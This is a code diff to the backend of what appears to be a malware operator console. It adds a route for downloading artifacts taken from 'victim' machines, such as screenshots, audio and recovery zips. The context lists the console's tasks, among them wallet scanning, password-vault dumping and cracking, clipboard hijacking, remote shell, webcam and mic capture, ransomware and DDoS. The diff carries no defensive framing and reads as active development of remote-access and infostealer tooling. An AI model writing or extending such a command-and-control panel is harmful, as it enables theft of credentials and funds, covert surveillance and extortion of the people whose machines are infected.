@@ -11,6 +11,7 @@ import { validateParams } from '../lib/task-schemas';
 import { dispatchCommand, hasControl } from './ws';
 import { compareVersion } from '../lib/agent-compat';
 import { capabilityMissing } from '../lib/agent-contract';
+import { mimeFor } from '../lib/mime';
 
 const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'mic', 'ransomware', 'ddos'] as const;
 
@@ -64,6 +65,36 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
       include: { victim: { select: { id: true, hostname: true, os: true } }, createdBy: { select: { email: true } } }
     });
     return { items };
+  });
+
+  /**
+   * Artefactos vinculados a una tarea. El modal de módulos lo usa para
+   * previsualizar/descargar binarios (capturas, audio, zips de recuperación)
+   * sin reinterpretar el `task.result`. Solo devuelve artefactos listos.
+   */
+  app.get('/tasks/:id/artifacts', async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const task = await prisma.task.findUnique({ where: { id }, select: { id: true, victimId: true } });
+    if (!task) throw notFound('task');
+    const artifacts = await prisma.artifact.findMany({
+      where: { taskId: id, victimId: task.victimId, status: 'ready' },
+      orderBy: { createdAt: 'asc' },
+      select: { id: true, module: true, bytes: true, manifest: true, createdAt: true }
+    });
+    return {
+      items: artifacts.map((artifact) => ({
+        id: artifact.id,
+        module: artifact.module,
+        bytes: artifact.bytes,
+        createdAt: artifact.createdAt,
+        files: ((artifact.manifest as { artifacts?: Array<{ path: string; size: number }> } | null)?.artifacts ?? []).map((file) => ({
+          path: file.path,
+          size: file.size,
+          mime: mimeFor(file.path),
+          url: `/api/console/artifacts/${artifact.id}/file?path=${encodeURIComponent(file.path)}`
+        }))
+      }))
+    };
   });
 
   app.post('/tasks', { preHandler: requireRole('operator') }, async (request, reply) => {
